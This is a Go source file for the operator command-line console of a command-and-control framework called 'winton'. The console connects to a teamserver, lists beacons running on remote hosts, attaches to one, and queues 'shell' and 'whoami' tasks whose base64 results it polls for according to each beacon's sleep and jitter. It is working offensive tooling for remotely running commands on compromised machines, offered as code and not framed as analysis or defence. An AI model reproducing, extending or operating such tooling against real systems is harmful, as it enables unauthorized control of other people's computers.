package cmd

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	winton "cli/cmd/winton"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/spf13/viper"
)

type Beacon struct {
	Beacon_UID    string
	Beacon_Sleep  int
	Beacon_Jitter int
	Tasks         []string
}

type Session struct {
	prompt    *readline.Instance
	print     *Print
	client    *winton.Client
	beacon    *Beacon
	printChan chan string
}

func promptInit(beaconUID string) string {
	username := viper.GetString("operator")
	dt := color.RedString(time.Now().Format("2006-01-02 15:04:05"))

	var promptText string

	if len(beaconUID) != 0 {
		uid := color.New(color.FgBlue).Sprint(beaconUID)
		promptText = fmt.Sprintf("[%s] %s@winton (%s) ", dt, username, uid)
	} else {
		promptText = fmt.Sprintf("[%s] %s@winton ", dt, username)
	}

	inputText := ">> "

	fullPrompt := promptText + inputText
	return fullPrompt
}

func NewSession() *Session {
	fullPrompt := promptInit("")

	rl, err := readline.New(fullPrompt)
	if err != nil {
		panic(err)
	}

	p := NewPrint()

	teamserver_string := fmt.Sprintf("%s:%s", viper.GetString("teamserver.ip"), viper.GetString("teamserver.port"))

	return &Session{
		prompt:    rl,
		print:     p,
		client:    winton.NewClient(teamserver_string),
		printChan: make(chan string),
	}
}

func (s *Session) Start() {
	defer s.prompt.Close()

	s.print.Welcome(viper.GetString("operator"))

	config := map[string]string{
		"Operator":        viper.GetString("operator"),
		"Teamserver IP":   viper.GetString("teamserver.ip"),
		"Teamserver Port": viper.GetString("teamserver.port"),
	}

	s.print.ConfigTable(config)

	agents, err := s.client.GetAgentList()
	if err != nil {
		fmt.Println(err)
	}

	s.client.AgentList = agents
	AgentChannel := make(chan []winton.Agent)

	go func() {
		for {
			agents, err := s.client.GetAgentList()
			if err != nil {
				fmt.Println(err)
			}
			if len(agents) != len(s.client.AgentList) {
				s.client.AgentList = agents
				AgentChannel <- agents
			}

			time.Sleep(5 * time.Second)
		}
	}()

	go func() {
		for {
			select {
			case msg := <-s.printChan:
				fmt.Println(msg)

			case agents := <-AgentChannel:
				s.print.Linebreak()
				s.print.Infof("Agent list updated: %d agents", len(agents))
			}
		}
	}()

	for {

		var update string
		if s.beacon != nil {
			update = promptInit(s.beacon.Beacon_UID)
		} else {
			update = promptInit("")
		}
		s.prompt.SetPrompt(update)
		s.print.Linebreak()

		line, err := s.prompt.Readline()
		if err != nil {
			break
		}

		if len(strings.Split(line, " ")) > 1 {
			if ok, err := s.processArgsCommand(line); !ok {
				if err != nil {
					fmt.Println("error:", err)
				}
				break
			}
		} else {
			if ok, err := s.processSingleCommand(line); !ok {
				if err != nil {
					fmt.Println("error:", err)
				}
				break
			}
		}
	}
}

func (s *Session) processArgsCommand(command string) (bool, error) {
	cmd := strings.Split(command, " ")[0]
	args := strings.Split(command, " ")[1:]

	if cmd == "async" {
		command = strings.Replace(command, "async", "", 1)
		command = strings.TrimSpace(command)
		_, err := s.handleAsync(command)
		if err != nil {
			fmt.Println(err)
		}
		s.print.Infof("Sending task asynchronously, check for results with `tasks`")
	}

	switch cmd {

	case "shell":
		if !s.beaconAttached() {
			return true, nil
		}

		s.print.BeaconSent(len([]byte(command)), s.beacon.Beacon_UID, "execute shell command")

		data, err := s.client.Send_Task(command, s.beacon.Beacon_UID)
		if err != nil {
			fmt.Println(err)
		}

		uid := data.Task_ID

		var task winton.Task
		task.Task_UID = uid
		task.Beacon_UID = s.beacon.Beacon_UID
		task.Cmd = command
		task.Status = "pending"
		task.Result = ""

		s.client.Tasks = append(s.client.Tasks, task)

		var (
			b64_result string
			size       int
		)

		for {

			time.Sleep(time.Duration(s.beacon.Beacon_Sleep)*time.Second + time.Duration(s.beacon.Beacon_Jitter)*time.Second)

			time.Sleep(1 * time.Second) // slight buffer

			b64_results, _ := s.client.Get_Response(uid)
			if len(b64_results.Results) > 0 {
				for _, result := range b64_results.Results {
					b64_result = result.Result
					size = len([]byte(b64_result))
				}
				break
			}
		}

		res, err := winton.DecodeResult(b64_result)
		if err != nil {
			fmt.Println(err)
		}

		for i, task := range s.client.Tasks {
			if task.Task_UID == uid {
				s.client.Tasks[i].Status = "complete"
				s.client.Tasks[i].Result = b64_result
			}
		}

		s.print.BeaconRecv(size)
		fmt.Println(res)

	case "b64decode":
		if len(args) != 1 {
			s.print.Errorf("Usage: b64decode <base64 string>")
		}

		b64 := args[0]
		decoded, err := winton.DecodeResult(b64)
		if err != nil {
			fmt.Println(err)
		}

		s.print.Infof("Decoded: %s", decoded)

	case "use":
		if len(args) != 1 {
			s.print.Errorf("Usage: use <UID>")
		}

		uid := args[0]
		agent, ok := s.client.FindAgentByUID(uid)
		if !ok {
			s.print.Errorf("Agent not found")
			return true, nil
		}

		s.print.Infof("Using agent %s (%s)", agent.Hostname, agent.IP)

		sleep, err := strconv.Atoi(agent.Sleep)
		if err != nil {
			fmt.Println(err)
		}

		jitter, err := strconv.Atoi(agent.Jitter)
		if err != nil {
			fmt.Println(err)
		}

		s.beacon = &Beacon{
			Beacon_UID:    agent.UID,
			Beacon_Sleep:  sleep,
			Beacon_Jitter: jitter,
		}
		return true, nil
	}

	return true, nil
}

func (s *Session) beaconAttached() bool {
	if s.beacon == nil {
		s.print.Errorf("No beacon selected")
		return false
	}
	return true
}

func (s *Session) handleAsync(command string) (bool, error) {
	// TODO: deprecate this and combine with processSingleCommand but with background flag

	switch command {
	case "whoami":
		if !s.beaconAttached() {
			return true, nil
		}

		s.print.BeaconSent(len([]byte(command)), s.beacon.Beacon_UID, "print current user")

		data, err := s.client.Send_Task(command, s.beacon.Beacon_UID)
		if err != nil {
			fmt.Println(err)
		}

		uid := data.Task_ID

		var task winton.Task
		task.Task_UID = uid
		task.Beacon_UID = s.beacon.Beacon_UID
		task.Cmd = command
		task.Status = "pending"
		task.Result = ""

		s.client.Tasks = append(s.client.Tasks, task)

		go func() {
			var b64_result string

			for {
				// check-in every 5 seconds
				time.Sleep(time.Duration(s.beacon.Beacon_Sleep)*time.Second + time.Duration(s.beacon.Beacon_Jitter)*time.Second)
				res, _ := s.client.Get_Response(uid)
				if len(res.Results) > 0 {
					for _, result := range res.Results {
						b64_result = result.Result
					}
					break
				}
			}
			for i, task := range s.client.Tasks {
				if task.Task_UID == uid {
					s.client.Tasks[i].Status = "complete"
					s.client.Tasks[i].Result = b64_result
				}
			}
		}()

		return true, nil
	}

	return true, nil
}

func (s *Session) processSingleCommand(command string) (bool, error) {
	switch command {
	case "exit":
		s.print.Infof("Exiting...")
		return false, nil

	case "beacons":
		s.print.AgentsTable(s.client.AgentList)
		return true, nil

	case "tasks":
		s.print.TasksTable(s.client.Tasks)
		return true, nil

	case "whoami":
		if !s.beaconAttached() {
			return true, nil
		}

		s.print.BeaconSent(34, s.beacon.Beacon_UID, "print current user")

		data, err := s.client.Send_Task("whoami", s.beacon.Beacon_UID)
		if err != nil {
			fmt.Println(err)
		}

		uid := data.Task_ID

		var task winton.Task
		task.Task_UID = uid
		task.Beacon_UID = s.beacon.Beacon_UID
		task.Cmd = "whoami"
		task.Status = "pending"
		task.Result = ""

		s.client.Tasks = append(s.client.Tasks, task)

		var (
			b64_result string
			size       int
		)

		for {

			time.Sleep(time.Duration(s.beacon.Beacon_Sleep)*time.Second + time.Duration(s.beacon.Beacon_Jitter)*time.Second)

			time.Sleep(1 * time.Second) // slight buffer

			b64_results, _ := s.client.Get_Response(uid)
			if len(b64_results.Results) > 0 {
				for _, result := range b64_results.Results {
					b64_result = result.Result
					size = len([]byte(b64_result))
				}
				break
			}

			// TODO: make this return asychronously, so we can print the output as it comes in
		}

		res, err := winton.DecodeResult(b64_result)
		if err != nil {
			fmt.Println(err)
		}

		// TODO: make this a function
		for i, task := range s.client.Tasks {
			if task.Task_UID == uid {
				s.client.Tasks[i].Status = "complete"
				s.client.Tasks[i].Result = b64_result
			}
		}

		s.print.BeaconRecv(size)
		fmt.Println(res)

		return true, nil

	case "clear":
		s.print.ClearScreen()
		return true, nil

	case "":
		return true, nil
	default:
		s.print.Errorf("Unknown command")
		return true, nil
	}
}
